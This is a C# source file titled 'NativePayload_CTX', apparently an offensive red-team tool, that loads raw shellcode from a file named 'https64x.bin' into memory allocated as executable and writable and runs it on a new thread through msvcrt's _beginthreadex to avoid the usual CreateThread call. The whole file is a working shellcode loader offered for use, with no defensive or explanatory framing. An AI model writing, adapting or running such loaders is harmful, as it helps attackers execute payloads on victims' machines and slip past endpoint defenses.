using System;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr _beginthreadex(IntPtr security, uint stack_size,
    /* ThreadStart start_address*/ IntPtr start_address, IntPtr arglist, uint initflag, out uint thrdaddr);
    static void Main(string[] args)
    {
        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.WriteLine("NativePayload_CTX, Published by Damon Mohammadbagher, Jul 2024");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine("NativePayload_CTX Create Thread via _beginthreadex function");
        Console.WriteLine();

        uint x = 0;
        byte[] pay = System.IO.File.ReadAllBytes("https64x.bin");
        IntPtr AddressOfPayload_In_Mem = VirtualAlloc(IntPtr.Zero, (uint)pay.Length, 0x1000, 0x40);            
        WriteProcessMemory(System.Diagnostics.Process.GetCurrentProcess().Handle
            , AddressOfPayload_In_Mem, pay,pay.Length,out x);
        //ThreadStart threadStart = new ThreadStart(ThreadFunction);
        IntPtr threadHandle = _beginthreadex(IntPtr.Zero, 0,AddressOfPayload_In_Mem,IntPtr.Zero, 0, out uint threadId);

        if (threadHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create thread.");
            return;
        }
        else
        {
            Console.WriteLine("thread id :" + threadId.ToString("X8") + " ==> Thandle" + threadHandle.ToString("X8"));
        }
        WaitForSingleObject(threadHandle, INFINITE);
    }

    static void ThreadFunction()
    {
        Console.WriteLine("Thread is running.");        
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize,
out uint lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private const uint INFINITE = 0xFFFFFFFF;


}
